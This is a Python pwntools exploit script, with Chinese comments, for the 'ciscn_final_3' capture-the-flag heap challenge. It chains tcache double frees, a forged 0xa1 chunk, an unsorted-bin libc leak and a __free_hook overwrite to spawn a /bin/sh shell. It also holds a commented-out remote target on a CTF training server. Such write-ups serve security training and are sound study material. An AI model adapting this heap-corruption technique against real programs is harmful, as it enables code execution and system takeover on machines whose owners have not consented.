from pwn import *

context.log_level = "DEBUG"
context.binary = './ciscn_final_3'
sh = process(['./ld.so', './ciscn_final_3'], env={'LD_PRELOAD': './libc.so.6'})
# sh = remote("node4.buuoj.cn", 29996)
libc = ELF("./libc.so.6")
elf = ELF("./ciscn_final_3")


def add(index, size, content):
    sh.sendlineafter('choice >', '1')
    sh.sendlineafter('input the index', str(index))
    sh.sendlineafter('input the size', str(size))
    sh.sendafter('now you can write something', content)
    sh.recvuntil('gift :')
    return int(sh.recvuntil('\n', drop=True), 16)


def delete(index):
    sh.sendlineafter('choice >', '2')
    sh.sendlineafter('input the index', str(index))


# === Step-1: 突破程序的chunk size<=0x81的限制，构造并拿到一个size=0xa1的fake chunk
# vmmap查看heap base # heap chunks查看 # PIE导致heap基址会变 但可利用不变的偏移来计算
heap_base = add(0, 0x20, "a") - 0x555555b5de70 + 0x0000555555b4c000
print("heap_base=>", hex(heap_base))  # 对照 vmmap 输出的heap基址是否相同

gdb.attach(sh)

add(1, 0x70, p64(0xdeadbeef012345) + p64(0xa1))  # 用新申请的这个chunk的content去构造 fake chunk的size域
# 前64bit: prev_size(没free的时候其实是上一个chunk的user data, 可乱填) 后64bit: size=0xa1
# 查看构造的fake chunk:  x /30xg 0x55555750fea0 # 这个地址是 heap chunks 输出的上一个add的chunk的地址
# 1. 伪造下一chunk.size; 2. 伪造下下个chunk.size域(大于0x21) 否则报 corrupted size vs. prev_size error
add(2, 0x70, b"a" * 0x20 + p64(0xdeadbeef) + p64(0x21) + b"b" * 0x18 + p64(0x91))
# 0x60+0x10(prev_size,size)+0x20("a")+p64(0xdeadbeef)+size(0x21)
delete(0)  # 最早free的在tcache链表的最末端
delete(0)  # Tcachebins[idx=1, size=0x30] count=2 # 成环
delete(0)  # Tcachebins[idx=1, size=0x30] count=3 ← Chunk(addr=0x555555b5de70, size=0x30... 成环
# 把刚刚delete到tcache(0x30)的申请回来一个，和剩下在tcache(0x30)的chunk是同一个 改手里的chunk.fd也会改tcache上的fd
# 0x11eb0 计算方式: fake chunk的fd域的地址-heap基址  # 注意不是chunk的基址 是chunk user data的地址
# entry -> 0x31_chunk -> 0xa1_chunk # 再拿两次得到fake chunk
add(3, 0x20, p64(heap_base + 0x11eb0))
add(4, 0x20, "ab")  # entry被修改为heap_base+0x11eb0
fake_chunk_addr = add(5, 0x20, "ff")   # 拿出的这个chunk就是刚刚构造的fake chunk(size=0xa1)
print("fake chunk addr=>", hex(fake_chunk_addr))  # 通过gift输出的addr对比 # x /50xg addr-0x10 第二行末尾是0xa1


# === Step-2: put fake_chunk into tcache(0x51)。改fake_chunk.size=0x51(可以申请回来的大小)放入tcache(0x51) 再改回0xa1
delete(1)  # tcache(0x51).e->c_1 # 这个chunk可以控制fake chunk的size # delete后再申请回来，改 fake_chunk.size
add(6, 0x70, p64(0xdeadbeef1111) + p64(0x51))  # fake chunk.size=0x51
delete(5)  # tcache(0x51).e->fake_chunk
delete(5)  # tcache(0x51).e->fake_chunk->fake_chunk  # !!! 后续会把这个拿回去
delete(1)  # delete后再申请回来，改fake_chunk.size
add(7, 0x70, p64(0xdeadbeef2222) + p64(0xa1))  # fake chunk.size=0xa1 # fake_chunk.size 改回0xa1


# === Step-3: put fake_chunk into unsorted bins
for i in range(7):  # 填满tcahe(0xa1)
    delete(5)  # fake_chunk
# Tcachebins[idx=8, size=0xa0] count=7 # tcahe(0xa1)已满 unsorted bins为空
delete(5)  # unsorted bins->fake_chunk # 链入unsorted bins链表时 fw bk指针指向libc上的一个结构

# tcache(0x51)上存储的fake_chunk fd域改成了libc上的地址(即tcache(0x51)第二个chunk在libc上)
# tcache(0x51).e->fake_chunk->some_addr_in_libc

# === Step-4: leack libc addr: 从tcache(0x51) malloc两次得到libc上的地址
add(8, 0x40, "a")  # tcache(0x51).e->some_addr_in_libc
# 再拿一次 返回的addr就是前面的fw的值，通过vmmap对比计算出偏移量得到libc基址
libc_addr = add(9, 0x40, "a") - 0x7fc25a088ca0 + 0x00007fc259c9d000
print("libc addr=>", hex(libc_addr))  # 对照这里的基址和vmmap里的libc的基址对不对
libc.address = libc_addr

# === Step5: change __free_hook : double free
delete(1)  # 这里用8去double free会被检测出double free 原因待探究 # to tcache(0x81)
delete(1)
delete(1)  # tache(0x81).e -> c -> c -> c
add(10, 0x70, p64(libc.symbols["__free_hook"]))  # tache(0x81).e -> c -> __free_hook
add(11, 0x70, "a")  # tache(0x81).e -> __free_hook
add(12, 0x70, p64(libc.symbols["puts"]))  # *__free_hook = libc.symbols["puts"]
# 本地用system测会有问题 可以用pust替代先看效果
# x /xg &__free_hook 查看__free_hook有没被修改(默认为NULL)


# === Step-6: getshell system("/bin/sh")
add(13, 0x70, "/bin/sh\0")  # 这里的size随意 只要是程序允许申请的大小即可
delete(13)  # trigger __free_hook # get shell

sh.interactive(">>>interactive>>>")
